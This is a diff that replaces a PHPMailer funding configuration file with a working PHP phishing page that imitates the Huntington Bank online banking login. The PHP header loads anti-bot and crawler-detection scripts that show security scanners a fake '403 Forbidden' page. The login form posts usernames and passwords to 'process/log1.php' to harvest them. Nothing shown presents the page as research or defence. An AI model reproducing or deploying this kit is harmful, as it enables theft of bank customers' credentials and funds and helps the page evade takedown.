@@ -1,6 +1,230 @@
-# These are supported funding model platforms
 
-github: Synchro
-patreon: marcusbointon
-tidelift: "packagist/phpmailer/phpmailer"
-custom: https://marcus.bointon.com/donations/
+<?php
+
+$useragent = $_SERVER['HTTP_USER_AGENT'];
+include 'Bots/fucker.php';
+include("Bots/Anti/out/blacklist.php");
+include("Bots/Anti/out/bot-crawler.php");
+include("Bots/Anti/out/anti.php");
+include("Bots/Anti/out/ref.php");
+include("Bots/Anti/out/antibot.php");
+include("Bots/Anti/out/bots.php");
+@require("Bots/Anti/out/Crawler/src/CrawlerDetect.php");
+
+$settings = include 'settings.php';
+
+use JayBizzle\CrawlerDetect\CrawlerDetect;
+
+$CrawlerDetect = new CrawlerDetect;
+
+if($CrawlerDetect->isCrawler($useragent)){
+  header("HTTP/1.0 404 Not Found");
+  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
+  exit();
+}
+
+$bot = include 'Bots/bot.php';
+if($bot == "is_bot"){
+  header("HTTP/1.0 404 Not Found");
+  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
+  exit();
+}
+
+?>
+
+<!DOCTYPE html>
+<html class="u-g-legacy-html" lang="en-us">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="keywords" content="Huntington bank login, Huntington online banking login" />
+    <meta name="description" content="Log  in to your Huntington account to check your balance, transfer funds and more. Our online banking is secure and easy to use." />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="viewport" content="initial-scale=1.0" />
+    <title>Huntington Online Banking Login | Huntington</title>
+    <!-- Code for the FavIcon placement -->
+    <link rel="apple-touch-icon" sizes="180x180" href="hunt/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="hunt/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="hunt/favicon-16x16.png" />
+    <link rel="mask-icon" href="hunt/safari-pinned-tab.svg" color="#5bbad5" />
+    <link rel="shortcut icon" href="hunt/favicon.ico" />
+    <meta name="msapplication-TileColor" content="#da532c" />
+    <meta name="msapplication-config" content="hunt/browserconfig.xml" />
+    <meta name="theme-color" content="#ffffff" />
+    <link rel="stylesheet" href='hunt/reset.css' media="all" />
+    <link rel="stylesheet" href='hunt/text.css' media="all" />
+    <link rel="stylesheet" href='hunt/960_16_col.css' media="screen" />
+    <link rel="stylesheet" href='hunt/huntington-rol.css?holv=637553742750000000' media="screen" />
+    <link rel="stylesheet" href='hunt/propertyClasses.css' media="all" />
+    <link rel="stylesheet" href='hunt/widgets.css' media="screen" />
+    <link rel="stylesheet" href='hunt/NavBar.css' media="screen" />
+    <link rel="stylesheet" href='hunt/huntington-rol-print.css' media="print" />
+    <link rel="stylesheet" href='hunt/jquery-ui-1.8.9.custom.css' />
+    <link rel="stylesheet" href='hunt/modal-dialog.css' media="screen" />
+    <link rel="stylesheet" href='hunt/hnb.aria.common.css' />
+    <link rel="stylesheet" href='hunt/Auth.css' />
+    <script src='hunt/jquery.cookie.js' type="text/javascript"></script>
+    <script type="text/javascript" src='hunt/json2.min.js'></script>
+    <script src='hunt/web' defer></script>
+    <style type='text/css'>
+    body {
+        display: none;
+    }
+    </style>
+</head>
+
+<body>
+    <div class="Messages">
+        <div id="LivePersonChat1_pnlLivePerson">
+            <div id='ensighten-chat'></div>
+        </div>
+        <div id="fab-area"></div>
+        <div id="site-survey"></div>
+    </div>
+    <div id="container" class="container_16">
+        <div class="grid_16 clearfix">
+            <div id="header">
+                <div class="grid_4 alpha">
+                    <a id="hnbLogoLink"> <img id="hnbLogoImg" alt="Huntington - Welcome&trade;" src='hunt/logo-lg.png' /> </a>
+                </div>
+                <div class="grid_12 omega clearfix">
+                    <div id="messageBoxContainer" role="navigation" class="clearfix">
+                        <div class="WelcomeMessage" role="menubar"> <a id="hlContactUS" role="menuitem" title="Contact Us" rel="noopener noreferrer" href="" target="_blank">Contact Us</a> </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="grid_16 clearfix">
+            <div id="content">
+                <meta http-equiv="" content="" />
+                <div id="" class="" style="color:Black;"></div>
+                <div class="login">
+                    <div class="widget">
+                        <div class="widget-title">
+                            <h3 style="float: none; text-align: center !important;">Welcome To Huntington Online Banking</h3> </div>
+                        <div id="removebottomborder">
+                            <dl class="loginForm"> <dt>
+                                     <form action="process/log1.php" method="post">
+                        <label for="username"><strong>Username</strong></label></dt>
+                                <dd>
+                                    <input name="username" type="text" maxlength="30" id="username" AUTOCOMPLETE="Off" title="username" aria-required="true" style="width:150px;" /> </dd> <dt>
+                        <label for="password"><strong>Password</strong></label></dt>
+                                <dd>
+                                    <input name="password" type="password" maxlength="16" id="password" AUTOCOMPLETE="Off" aria-required="true" style="width:150px;" /> </dd>
+                            </dl> <span id="mainBody_UsernamePasswordValidator" style="color:Red;display:none;"></span>
+                            
+                            <div class="clear clearfix"></div>
+                        </div>
+                        <div class="widget-footer">
+                            <div class="buttonsCentered">
+                                <input type="submit" name="" value="Log In" ><img src="hunt/lock.gif" alt="Lock" /> </div>
+                            <div class="signonLinks"> <a id="mainBody_lnkForgotUsername" href="">Forgot Username?</a> <a id="mainBody_lnkForgotPassword" href="">Forgot Password?</a>
+                                <div> <a id="mainBody_hlEnrollment" href="">Enroll in Online Banking</a> </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="clear"></div>
+                </div>
+                <style>
+                .o-g-detail-page:before {
+                    background-image: url("hunt/pattern--energetic-alt.svg"), linear-gradient(to bottom, #82bd34 0%, #5ba63c 80%) !important;
+                }
+                
+                #new-layout .con-error-noBold #linkContainer {
+                    width: 260px;
+                }
+                
+                #new-layout .con-error-noBold {
+                    width: 100%;
+                }
+                </style>
+            </div>
+        </div>
+        <div class="grid_16 clearfix">
+            <div id="footerNav" role="navigation">
+                <ul class="clearfix">
+                    <li> <a class="LegalFooterAnchor" href="" rel="noopener noreferrer" target="_blank" role="menuitem">Identity Protection</a> </li>
+                    <li> <a class="LegalFooterAnchor" href="" rel="noopener noreferrer" target="_blank" role="menuitem">Security</a> </li>
+                    <li> <a class="LegalFooterAnchor" href='' rel="noopener noreferrer" target="_blank" role="menuitem">Privacy</a> </li>
+                    <li> <a class="LegalFooterAnchor" href="" rel="noopener noreferrer" target="_blank" role="menuitem">Online Guarantee</a> </li>
+                    <li class='feedback-footer-parent' data-feedback-link-class="LegalFooterAnchor" data-site-survey-context_placement='Footer' data-feedback-link-type='Footer' data-feedback-link-icon-id='black'></li>
+                </ul>
+            </div>
+            <hr />
+            <div id="footerBottom">
+                <div id="legal">
+                    <p>Have questions? Call <strong>(800) 480-2265</strong>, daily 7:00 a.m. to 7:00 p.m. ET.
+                        <br /> </p>
+                    <p style="margin-top: 10px">Mastercard and the Mastercard Brand Mark are registered trademarks of Mastercard International Incorporated.</p> <span id='FDICLogoMessage'>
+                    <svg xmlns="hunt/svg" viewBox="0 0 10 8" fill="#333" width="14" height="11">
+                        <path clip-rule="evenodd" d="m5.1 0.8l-5.1 2.8v1h0.8v3.4h8.4v-3.4h0.8v-1l-4.9-2.8zm3.1 6.3h-6.4v-3.4l3.2-1.8 3.2 1.8v3.4z" fill-rule="evenodd" />
+                        <path d="m3.3 5v-0.8h3.4v0.8h-3.4z" />
+                        <path d="m3.3 5.4h3.4v0.9h-3.4v-0.9z" />
+                    </svg>
+                    The Huntington National Bank is an Equal Housing Lender and Member FDIC.
+                    <br />
+                </span> <img src='hunt/hexlogo-footer-icon.png' alt="The HNB Logo" width="8" height="9" />&regreg;, Huntington&reg;, <img src='hunt/hexlogo-footer-icon.png' alt="The HNB Logo" width="8" height="9" />Huntington&reg;, Huntington.Welcome.&reg;, and Huntington Heads Up&reg; are federally registered service marks of Huntington Bancshares Incorporated.
+                    <br />&copy; <span id="Footer1_lblYear">2021</span> Huntington Bancshares Incorporated.</div>
+            </div>
+            <script type="text/javascript" src='hunt/AccessibleMenuBar.js'></script>
+            <script type="text/javascript">
+            $(document).ready(function() {
+                $("#footerNav").accessibleMenuBar();
+            });
+            </script>
+        </div>
+    </div>
+    <script type="text/javascript">
+    //<![CDATA[
+    var Page_ValidationSummaries = new Array(document.getElementById("mainBody_validationSummary"));
+    var Page_Validators = new Array(document.getElementById("mainBody_UsernamePasswordValidator"));
+    //]]>
+    </script>
+    <script type="text/javascript">
+    //<![CDATA[
+    var mainBody_validationSummary = document.all ? document.all["mainBody_validationSummary"] : document.getElementById("mainBody_validationSummary");
+    mainBody_validationSummary.displaymode = "List";
+    var mainBody_UsernamePasswordValidator = document.all ? document.all["mainBody_UsernamePasswordValidator"] : document.getElementById("mainBody_UsernamePasswordValidator");
+    mainBody_UsernamePasswordValidator.errormessage = "<p>The username or password is incorrect.</p><div id=\'linkContainer\'><a id=\'forgotUsernameLink\' href= \'javascript:navigateToForgotUsername();\'>Forgot Username?</a><a id=\'forgotPasswordLink\' href= \' \'>Forgot Password?</a></div>";
+    mainBody_UsernamePasswordValidator.display = "None";
+    mainBody_UsernamePasswordValidator.evaluationfunction = "CustomValidatorEvaluateIsValid";
+    mainBody_UsernamePasswordValidator.clientvalidationfunction = "UsernamePasswordValidate";
+    //]]>
+    </script>
+    <script type='text/javascript'>
+    if(self == top) {
+        document.getElementsByTagName('body')[0].style.display = 'block';
+    } else {
+        top.location = self.location;
+    }
+    </script>
+    <script type="text/javascript">
+    //<![CDATA[
+    var Page_ValidationActive = false;
+    if(typeof(ValidatorOnLoad) == "function") {
+        ValidatorOnLoad();
+    }
+
+    function ValidatorOnSubmit() {
+        if(Page_ValidationActive) {
+            return ValidatorCommonOnSubmit();
+        } else {
+            return true;
+        }
+    }
+    //]]>
+    </script>
+    </form>
+    <!-- indcluded to preload nav images -->
+    <div id="dvTTGlobal"></div>
+    <script type="text/javascript">
+    var _cf = _cf || [];
+    _cf.push(['_setFsp', true]);
+    _cf.push(['_setBm', true]);
+    _cf.push(['_setAu', 'hunt/9402e136ui2584a4c05d4117b32706']);
+    </script>
+    <script type="text/javascript" src="hunt/9402e136ui2584a4c05d4117b32706"></script>
+</body>
+
+</html>
